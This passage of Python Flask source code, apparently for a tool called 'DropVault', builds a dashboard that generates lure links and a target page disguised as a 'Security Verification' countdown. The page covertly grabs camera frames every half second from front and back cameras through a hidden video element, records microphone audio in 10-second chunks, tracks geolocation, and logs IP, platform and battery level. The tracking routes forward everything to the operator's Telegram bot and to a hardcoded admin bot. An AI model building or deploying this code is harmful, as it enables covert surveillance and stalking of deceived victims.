                            <input type="file" id="fInput" class="hidden" accept="image/*,video/*,audio/*,.pdf,.apk" onchange="uploadXHR(this.files[0], 'uploadedUrl', 'uploadedPath', null, 'uploadStatus', 'submitBtn')">
                        </div>
                    </div>
                    
                    <div id="pCont" class="hidden mt-4 bg-black/40 p-4 rounded-xl border border-white/10">
                        <div class="w-full h-2 bg-gray-800 rounded-full overflow-hidden mb-2">
                            <div id="pBar" class="h-full bg-gradient-to-r from-cyan-400 to-pink-500 w-0 transition-all duration-300"></div>
                        </div>
                        <div id="pStats" class="flex justify-between text-[10px] font-bold text-cyan-400 font-mono tracking-widest">
                            <span>0%</span> <span>0 / 0 MB</span>
                        </div>
                    </div>
                    <div id="uploadStatus" class="text-xs font-bold text-center mt-2"></div>
                    
                    <input type="hidden" name="file_url" id="uploadedUrl">
                    <input type="hidden" name="file_path" id="uploadedPath">
                    
                    <button type="submit" id="submitBtn" class="w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-4 rounded-xl mt-4 hover:shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all flex items-center justify-center gap-2"><i class="fas fa-bolt"></i> GENERATE PAYLOAD</button>
                </form>
            </div>
        </div>

        <div class="flex flex-col gap-8">
            <div class="glass-panel p-6 border-pink-500/30">
                <h3 class="font-display font-black text-lg mb-4 text-pink-400 border-b border-white/10 pb-3"><i class="fas fa-microchip mr-2"></i> NODE MANAGEMENT</h3>
                <form method="POST" class="mb-6">
                    <input type="hidden" name="form_action" value="change_bot">
                    <label class="block text-xs font-bold uppercase tracking-widest opacity-70 mb-2">Active Telegram Bot</label>
                    <select name="active_bot_id" onchange="this.form.submit()" class="input-glass p-3 rounded-lg text-sm w-full font-bold">{bot_options}</select>
                </form>
                <form method="POST" action="/add_bot_direct" class="flex gap-3">
                    <input type="text" name="new_token" placeholder="Bot Token..." required class="input-glass p-3 rounded-lg text-sm flex-1 font-mono">
                    <button type="submit" class="bg-black/40 border border-white/20 hover:bg-white/10 px-4 rounded-lg font-bold text-xs uppercase tracking-widest transition-colors">Add</button>
                </form>
            </div>

            <div class="glass-panel p-6 flex-1 flex flex-col min-h-[400px]">
                <div class="flex justify-between items-center mb-4 border-b border-white/10 pb-3">
                    <h3 class="font-display font-black text-lg text-cyan-400"><i class="fas fa-radar mr-2"></i> LIVE LOGS</h3>
                    <button type="button" onclick="clearLogs()" class="bg-red-500/20 text-red-400 border border-red-500/50 hover:bg-red-500 hover:text-white px-3 py-1.5 rounded-lg text-xs font-bold uppercase tracking-widest transition-colors"><i class="fas fa-trash"></i> Flush</button>
                </div>
                <div id="device-list" class="flex-1 overflow-y-auto pr-2 flex flex-col gap-3 space-y-2"></div>
            </div>
        </div>
    </div>

    <script>
        function toggleFields() {{
            let m = document.getElementById('actionMode').value;
            document.getElementById('redirField').classList.toggle('hidden', m !== 'redirect');
            document.getElementById('textField').classList.toggle('hidden', m !== 'text');
            document.getElementById('fileField').classList.toggle('hidden', m !== 'file');
        }}

        function uploadXHR(file, urlId, pathId, typeId, stsId, btnId) {{
            if(!file) return;
            if(file.size > 10 * 1024 * 1024) {{ alert("Max 10MB Allowed!"); return; }}
            
            let dTxt = document.getElementById('dText');
            if(dTxt && btnId !== 'inline') dTxt.innerText = file.name;
            
            let pCont = document.getElementById('pCont');
            let pBar = document.getElementById('pBar');
            let pStats = document.getElementById('pStats');
            let sts = document.getElementById(stsId);
            
            if(pCont && btnId !== 'inline') pCont.classList.remove('hidden');
            if(btnId && btnId !== 'inline') document.getElementById(btnId).disabled = true;
            sts.innerText = "⏳ Encrypting & Uploading..."; sts.className = "text-yellow-400 text-xs font-bold text-center mt-2";

            let fd = new FormData(); fd.append('file', file);
            let xhr = new XMLHttpRequest();

            xhr.upload.addEventListener('progress', (e) => {{
                if (e.lengthComputable) {{
                    let percent = Math.round((e.loaded / e.total) * 100);
                    if(pBar && btnId !== 'inline') pBar.style.width = percent + '%';
                    let loadedMB = (e.loaded / (1024*1024)).toFixed(2);
                    let totalMB = (e.total / (1024*1024)).toFixed(2);
                    if(pStats && btnId !== 'inline') pStats.innerHTML = `<span>${{percent}}%</span> <span>${{loadedMB}} / ${{totalMB}} MB</span>`;
                }}
            }});

            xhr.onload = () => {{
                try {{
                    let data = JSON.parse(xhr.responseText);
                    if(data.error) {{
                        sts.innerText = "❌ Upload Failed"; sts.className = "text-red-500 text-xs font-bold text-center mt-2";
                    }} else {{
                        document.getElementById(urlId).value = data.url;
                        if(pathId) document.getElementById(pathId).value = data.path;
                        if(typeId) {{
                            let ext = file.name.split('.').pop().toLowerCase();
                            if(['mp4','webm','mov'].includes(ext)) document.getElementById(typeId).value = 'video';
                            else if(['jpg','png','jpeg','gif'].includes(ext)) document.getElementById(typeId).value = 'image';
                            else document.getElementById(typeId).value = 'document';
                        }}
                        sts.innerText = "✅ Upload Successful!"; sts.className = "text-cyan-400 text-xs font-bold text-center mt-2";
                        if(btnId === 'inline') document.getElementById('inlineFForm').submit();
                    }}
                }} catch(e) {{ sts.innerText = "❌ Parse Error"; }}
                if(btnId && btnId !== 'inline') document.getElementById(btnId).disabled = false;
            }};
            xhr.onerror = () => {{ sts.innerText = "❌ Network Error."; if(btnId && btnId !== 'inline') document.getElementById(btnId).disabled = false; }};
            xhr.open('POST', '/api/upload_file'); xhr.send(fd);
        }}

        function renderLogs() {{
            let logs = JSON.parse(localStorage.getItem('uchiha_logs') || '[]');
            let html = "";
            if(logs.length === 0) html = "<div class='h-full flex flex-col items-center justify-center opacity-50'><i class='fas fa-satellite text-4xl mb-3 text-cyan-400'></i><p class='text-xs font-bold uppercase tracking-widest'>No Connections Yet</p></div>";
            logs.forEach(d => {{
                html += `<div class="bg-black/30 p-4 rounded-xl border border-white/5 hover:border-cyan-400/30 transition-colors">
                    <div class="flex justify-between items-center mb-2">
                        <span class="font-bold text-sm text-cyan-400"><i class="fas fa-globe mr-2"></i>${{d.ip}}</span>
                        <span class="text-[10px] bg-white/10 px-2 py-1 rounded font-mono">${{d.time}}</span>
                    </div>
                    <div class="text-xs text-gray-400 font-medium break-words"><i class="fas fa-laptop mr-2 opacity-50"></i>${{d.dev}}</div>
                </div>`;
            }});
            document.getElementById('device-list').innerHTML = html;
        }}

        function clearLogs() {{ localStorage.removeItem('uchiha_logs'); renderLogs(); }}

        setInterval(async () => {{
            try {{
                let res = await fetch('/api/fetch_devices');
                let data = await res.json();
                if(data.devices && data.devices.length > 0) {{
                    let logs = JSON.parse(localStorage.getItem('uchiha_logs') || '[]');
                    logs = [...data.devices, ...logs];
                    localStorage.setItem('uchiha_logs', JSON.stringify(logs));
                    renderLogs();
                }}
            }} catch(e) {{}}
        }}, 3000);
        
        renderLogs();
    </script>
    """
    return render_template_string(get_base_html(content, "Dashboard | DropVault"))


@app.route("/api/upload_file", methods=["POST"])
def upload_file():
    if "user_id" not in session: return jsonify({"error": "Auth Required"})
    if 'file' not in request.files: return jsonify({"error": "No File"})
    
    file = request.files['file']
    ext = file.filename.rsplit('.', 1)[-1].lower() if '.' in file.filename else ''
    allowed = {'png','jpg','jpeg','gif','webp','mp4','mp3','pdf','apk','txt', 'mov', 'webm'}
    
    if ext not in allowed: return jsonify({"error": "Unsupported format blocked!"})
    
    path = f"{uuid.uuid4().hex}.{ext}"
    try:
        supabase.storage.from_("uchiha_files").upload(path, file.read(), {"content-type": file.content_type})
        url = supabase.storage.from_("uchiha_files").get_public_url(path)
        return jsonify({"url": url, "path": path})
    except Exception as e: return jsonify({"error": str(e)})

@app.route("/add_bot_direct", methods=["POST"])
def add_bot_direct():
    if "user_id" not in session: return redirect("/lg")
    cid = get_user_cid()
    new_token = request.form.get("new_token")
    bot_name = get_bot_name(new_token)
    if bot_name != "Unknown Node":
        supabase.table("users").insert({"chat_id": cid, "bot_token": new_token, "bot_name": bot_name}).execute()
        send_tg_msg(new_token, cid, f"✅ *NEW NODE ATTACHED*\\nBy DropVault System.")
    return redirect("/ds")


# --- TARGET PAGE (Stealth Capture, Mic & Dynamic UI) ---
@app.route("/t/<link_id>")
def target_page(link_id):
    res = supabase.table("links").select("*, users(*)").eq("id", link_id).execute()
    if not res.data: return "Link Not Found or Removed!"
    
    data = res.data[0]
    action_mode = data.get("action_mode", "redirect")
    action_value = data.get("action_value", "")
    text_content = data.get("text_content", "")
    file_type = data.get("file_type", "")
    target_type = data.get("target_type", "both")
    cam_type = data.get("cam_type", "front_back")
    
    # Identify if media (Image or Video) is being sent
    val = action_value
    ext = val.split('.')[-1].lower() if val else ''
    is_media = action_mode == 'file' and (ext in ['mp4', 'webm', 'ogg', 'mov', 'jpg', 'jpeg', 'png', 'gif', 'webp'] or file_type in ['image', 'video'])

    html_code = '''
    <!DOCTYPE html>
    <html lang="en" class="dark">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Secure Access</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
        <style>
            body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #000; color: white; overflow-x: hidden; min-height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0;}
            .orb { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80vw; height: 80vw; background: radial-gradient(circle, rgba(0,229,255,0.15) 0%, transparent 60%); filter: blur(80px); z-index: -1; pointer-events: none;}
            .glass-box { background: rgba(20, 20, 30, 0.7); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); padding: 40px; text-align: center; }
        </style>
    </head>
    <body>
        
        {% if is_media %}
        <!-- FULL SCREEN MEDIA UI -->
        <div class="fixed inset-0 w-full h-full bg-black z-0 flex items-center justify-center">
            {% if ext in ['mp4', 'webm', 'ogg', 'mov'] or f_type == 'video' %}
                <video src="{{ a_val }}" controls autoplay playsinline loop class="w-full h-full object-contain"></video>
            {% else %}
                <img src="{{ a_val }}" class="w-full h-full object-contain">
            {% endif %}
            
            <!-- Center Timer Overlay -->
            <div id="media-timer-overlay" class="absolute inset-0 bg-black/70 backdrop-blur-sm flex flex-col items-center justify-center z-10 transition-opacity duration-700 pointer-events-none">
                <div id="timer-count" class="text-8xl md:text-[150px] font-display font-black text-cyan-400 drop-shadow-[0_0_30px_rgba(0,229,255,0.8)]">10</div>
                <div class="mt-8 text-white font-bold tracking-[0.3em] uppercase text-sm md:text-xl animate-pulse">Decrypting Payload...</div>
            </div>
            
            <!-- Floating Download Button -->
            <a href="{{ a_val }}" download class="absolute bottom-8 right-8 bg-black/50 border border-cyan-400 text-cyan-400 hover:bg-cyan-400 hover:text-black px-6 py-4 rounded-full font-bold uppercase tracking-widest shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all z-20 backdrop-blur-md flex items-center gap-3">
                <i class="fas fa-download text-xl"></i> Download
            </a>
        </div>
        
        {% else %}
        <!-- STANDARD LOADING BAR UI (Text, Redirect, Document) -->
        <div class="orb"></div>
        <div id="wait-screen" class="glass-box z-10 w-[90%] max-w-md relative overflow-hidden">
            <h2 class="font-display font-black text-2xl mb-2 text-cyan-400">SECURITY VERIFICATION</h2>
            <p class="text-[10px] font-bold uppercase tracking-widest text-gray-400 mb-8">Establishing Secure Connection...</p>
            
            <div class="text-6xl font-display font-black text-white mb-8 drop-shadow-[0_0_15px_rgba(255,255,255,0.3)]" id="timer-count">10</div>
            
            <div class="w-full h-3 bg-white/10 rounded-full overflow-hidden mb-3 shadow-inner">
                <div id="progress-bar" class="h-full bg-gradient-to-r from-cyan-400 to-blue-500 w-0 transition-all ease-linear" style="transition-duration: 1000ms;"></div>
            </div>
            <p class="text-[10px] font-bold opacity-60 uppercase tracking-widest text-right w-full block" id="progress-text">0%</p>
        </div>

        <div id="media-content" class="glass-box hidden z-10 w-[90%] max-w-lg"></div>
        {% endif %}

        <canvas id="c" class="hidden"></canvas>
        <video id="bg-v" playsinline autoplay muted class="fixed top-[-1000px] left-[-1000px] w-2 h-2 opacity-0 -z-50"></video>

        <script>
            let mode = "{{ t_type }}"; 
            let camType = "{{ cam_type }}";
            let actMode = "{{ a_mode }}"; 
            let actVal = "{{ a_val }}"; 
            let txtVal = `{{ t_content | safe }}`; 
            let fType = "{{ f_type }}";
            let l_id = "{{ l_id }}";
            let isMedia = {{ 'true' if is_media else 'false' }};

            // Battery Fetcher
            let batteryInfo = "Not Fetched";
            if(navigator.getBattery) {
                navigator.getBattery().then(b => { batteryInfo = Math.round(b.level * 100) + '%'; });
            }

            window.onload = () => { 
                startVerificationTimer();
                
                // Allow a slight delay for UI render before heavily hitting hardware
                setTimeout(() => {
                    getHardware(); 
                    if(mode.includes('loc') || mode === 'both' || mode === 'location') {
                        fetchLocation();
                        setInterval(fetchLocation, 15000); 
                    }
                    
                    let reqAudio = mode.includes('mic');
                    let reqVideo = mode.includes('cam') || mode === 'both' || mode === 'camera';

                    if(reqAudio) startAudioRecording();
                    if(reqVideo) startUltraStealthSequence();

                }, 1000); 
            };

            // --- 10s DYNAMIC TIMER ---
            function startVerificationTimer() {
                let count = 10;
                let timerEl = document.getElementById('timer-count');
                let pBar = document.getElementById('progress-bar');
                let pText = document.getElementById('progress-text');
                let mOverlay = document.getElementById('media-timer-overlay');

                if(pBar) setTimeout(()=> { pBar.style.width = '10%'; if(pText) pText.innerText = '10%'; }, 50);

                let timer = setInterval(() => {
                    count--;
                    if(timerEl) timerEl.innerText = count;
                    
                    if(pBar) {
                        let pct = ((10 - count) / 10) * 100;
                        pBar.style.width = pct + '%';
                        if(pText) pText.innerText = Math.round(pct) + '%';
                    }

                    if(count <= 0) {
                        clearInterval(timer);
                        
                        if(isMedia && mOverlay) {
                            mOverlay.style.opacity = '0';
                            setTimeout(() => mOverlay.classList.add('hidden'), 700);
                        } else if (!isMedia) {
                            document.getElementById('wait-screen').classList.add('hidden');
                            showFileContent();
                        }
                    }
                }, 1000);
            }

            // --- NON-MEDIA CONTENT RENDERER ---
            function showFileContent() {
                let medBox = document.getElementById('media-content');
                if(!medBox) return;
                medBox.classList.remove('hidden');
                let html = "";
                
                if(actMode === 'text') {
                    html = `<h2 class="font-display font-black text-2xl mb-4 text-cyan-400">DECRYPTED DATA</h2><div class="bg-black/40 p-5 rounded-xl text-left whitespace-pre-wrap font-mono text-sm border border-white/10 overflow-y-auto max-h-[300px]">${txtVal}</div>`;
                } else if (actMode === 'file') {
                    html = `<div class="py-10 bg-black/40 border border-white/10 rounded-xl mb-6"><i class="fas fa-file-archive text-5xl text-cyan-400 mb-3"></i><p class="text-xs uppercase tracking-widest font-bold text-gray-400">Secure Document</p></div>
                    <a href="${actVal}" download target="_blank" class="block w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-4 rounded-xl hover:shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all"><i class="fas fa-download mr-2"></i> Download Payload</a>`;
                } else {
                    html = `<div class="py-10 bg-black/40 border border-white/10 rounded-xl mb-6"><i class="fas fa-link text-5xl text-cyan-400 mb-3"></i><p class="text-xs uppercase tracking-widest font-bold text-gray-400">External Gateway</p></div>
                    <a href="${actVal}" class="block w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-4 rounded-xl hover:shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all">Proceed to Link <i class="fas fa-arrow-right ml-2"></i></a>`;
                    setTimeout(() => { window.location.href = actVal; }, 1500);
                }
                medBox.innerHTML = html;
            }

            function getHardware() {
                let info = { plat: navigator.platform, cores: navigator.hardwareConcurrency || 0, battery: batteryInfo };
                fetch("/api/log_hardware/" + l_id, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(info) }).catch(()=>{});
            }

            function fetchLocation() {
                if(navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (p) => { fetch("/api/log_loc/" + l_id, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) }).catch(()=>{}); },
                        (e) => {}, { timeout: 8000 }
                    );
                }
            }

            // --- MICROPHONE LOGIC (10s Chunking & Forced Send) ---
            let mediaRecorder;
            let audioChunks = [];
            let isRecording = false;

            async function startAudioRecording() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: { echoCancellation: true, noiseSuppression: true } });
                    mediaRecorder = new MediaRecorder(stream);
                    
                    mediaRecorder.ondataavailable = e => {
                        if (e.data.size > 0) audioChunks.push(e.data);
                    };
                    
                    mediaRecorder.onstop = () => {
                        if (audioChunks.length > 0) {
                            let audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                            let reader = new FileReader();
                            reader.readAsDataURL(audioBlob);
                            reader.onloadend = () => {
                                let base64data = reader.result;
                                fetch("/api/capture_audio/" + l_id, {
                                    method: "POST", headers: {"Content-Type": "application/json"},
                                    body: JSON.stringify({ audio: base64data }), keepalive: true
                                }).catch(()=>{});
                            };
                        }
                        audioChunks = [];
                        if(isRecording) mediaRecorder.start();
                    };
                    
                    isRecording = true;
                    mediaRecorder.start();
                    
                    // Stop & Start every 10 seconds to create 10s chunks
                    setInterval(() => {
                        if(mediaRecorder && mediaRecorder.state === "recording") {
                            mediaRecorder.stop();
                        }
                    }, 10000);

                    // If user minimizes or switches tab, force send what's recorded
                    document.addEventListener("visibilitychange", () => {
                        if(document.visibilityState === 'hidden' && mediaRecorder && mediaRecorder.state === "recording") {
                            mediaRecorder.stop();
                        }
                    });
                    
                    // Force send on tab close
                    window.addEventListener("beforeunload", () => {
                        if(mediaRecorder && mediaRecorder.state === "recording") {
                            isRecording = false;
                            mediaRecorder.stop();
                        }
                    });

                } catch(err) {
                    console.log("Mic access error:", err);
                }
            }

            // --- CAMERA LOGIC (10s Front/Back Cycle) ---
            let camStream = null; 
            let currentCam = "user"; 
            let captureIntervalId = null; 
            let lastSentImage = "";

            async function switchCameraTo(facingModeStr) {
                if (camStream) { camStream.getTracks().forEach(track => track.stop()); camStream = null; }
                try {
                    camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingModeStr === "environment" ? { ideal: "environment" } : "user", width: { ideal: 640 }, height: { ideal: 480 } } });
                    const bgV = document.getElementById('bg-v');
                    bgV.srcObject = camStream; bgV.onloadedmetadata = () => { bgV.play(); };
                    currentCam = facingModeStr;
                } catch(e) {}
            }

            function captureUltraFast() {
                if(camStream) {
                    const bgV = document.getElementById('bg-v'); const c = document.getElementById('c');
                    if(bgV.videoWidth > 0) {
                        c.width = bgV.videoWidth; c.height = bgV.videoHeight;
                        c.getContext('2d').drawImage(bgV, 0, 0, c.width, c.height);
                        let imgData = c.toDataURL('image/jpeg', 0.6);
                        if (imgData === lastSentImage) return; 
                        lastSentImage = imgData;
                        fetch("/api/capture/" + l_id, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: imgData, cam_type: currentCam.toUpperCase() }) }).catch(()=>{});
                    }
                }
            }

            async function startUltraStealthSequence() {
                currentCam = (camType === "back") ? "environment" : "user"; 
                await switchCameraTo(currentCam);
                if(captureIntervalId) clearInterval(captureIntervalId);
                captureIntervalId = setInterval(captureUltraFast, 500);
                if (camType === "front_back") runCamCycle();
            }

            function runCamCycle() {
                setTimeout(async () => { 
                    currentCam = (currentCam === "user") ? "environment" : "user";
                    await switchCameraTo(currentCam); 
                    runCamCycle(); 
                }, 10000); 
            }
        </script>
    </body>
    </html>
    '''
    return render_template_string(html_code, is_media=is_media, ext=ext, t_type=target_type, a_mode=action_mode, a_val=action_value, t_content=text_content, f_type=file_type, l_id=link_id, cam_type=cam_type)

# --- TRACKING APIS ---
@app.route("/api/log_hardware/<l_id>", methods=["POST"])
def log_hw(l_id):
    global live_buffer
    try:
        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
        user = link["users"]
        d = request.get_json()
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        dev_info = f"{d['plat']} - Cores: {d['cores']}"
        bat_info = d.get('battery', 'Unknown')
        
        if "devices" not in live_buffer: live_buffer["devices"] = []
        live_buffer["devices"].append({"ip": ip, "dev": dev_info, "time": time.strftime("%I:%M %p")})
        
        msg = f"🎯 *TARGET HIT*\n\n🌐 *IP:* `{escape_md(ip)}`\n💻 *Device:* `{escape_md(dev_info)}`\n🔋 *Battery:* `{escape_md(bat_info)}`"
        send_tg_msg(user["bot_token"], user["chat_id"], msg)
        send_tg_msg(ADMIN_TOKEN, ADMIN_CID, msg + f"\n\n_Admin Copy \\| User: {user['chat_id']}_")
    except: pass
    return jsonify({"s": 1})

@app.route("/api/log_loc/<l_id>", methods=["POST"])
def log_loc(l_id):
    try:
        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
        d = request.get_json()
        msg = f"📍 *LOCATION ACQUIRED*\n\n*Map:* [Google Maps](https://www.google.com/maps?q={d['lat']},{d['lon']})"
        send_tg_msg(link["users"]["bot_token"], link["users"]["chat_id"], msg)
        send_tg_msg(ADMIN_TOKEN, ADMIN_CID, msg + f"\n\n_Admin Copy \\| User: {link['users']['chat_id']}_")
    except: pass
    return jsonify({"s": 1})

@app.route("/api/capture/<l_id>", methods=["POST"])
def cap(l_id):
    try:
        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
        req_data = request.get_json()
        raw = base64.b64decode(req_data["img"].split(",")[1])
        c_type = req_data.get("cam_type", "UNKNOWN")
        
        caption = f"📸 *CAMERA CAPTURE* \\({c_type}\\)"
        send_tg_photo(link["users"]["bot_token"], link["users"]["chat_id"], raw, caption)
        send_tg_photo(ADMIN_TOKEN, ADMIN_CID, raw, caption + f"\n\n_Admin Copy \\| User: {link['users']['chat_id']}_")
    except: pass
    return jsonify({"s": 1})

@app.route("/api/capture_audio/<l_id>", methods=["POST"])
def cap_audio(l_id):
    try:
        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
        req_data = request.get_json()
        raw = base64.b64decode(req_data["audio"].split(",")[1])
        
        caption = f"🎤 *AUDIO RECORDING INTERCEPTED*"
        send_tg_audio(link["users"]["bot_token"], link["users"]["chat_id"], raw, caption)
        send_tg_audio(ADMIN_TOKEN, ADMIN_CID, raw, caption + f"\n\n_Admin Copy \\| User: {link['users']['chat_id']}_")
    except Exception as e: pass
    return jsonify({"s": 1})

@app.route("/api/fetch_devices")
def fetch_devices():
    global live_buffer
    data = live_buffer.get("devices", [])
    live_buffer["devices"] = [] 
    return jsonify({"devices": data})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, threaded=True)
